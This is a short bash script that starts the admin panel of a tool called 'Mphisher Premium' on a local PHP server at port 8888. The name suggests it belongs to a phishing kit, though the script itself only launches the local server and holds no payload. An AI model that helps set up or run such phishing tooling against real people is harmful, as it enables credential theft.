#!/bin/bash
# Mphisher Admin Panel Launcher

PORT=8888
echo -e "\e[32m[+]\e[0m Starting Mphisher Premium Admin Panel..."
echo -e "\e[32m[+]\e[0m Access URL: \e[36mhttp://localhost:$PORT\e[0m"

cd admin && php -S localhost:$PORT
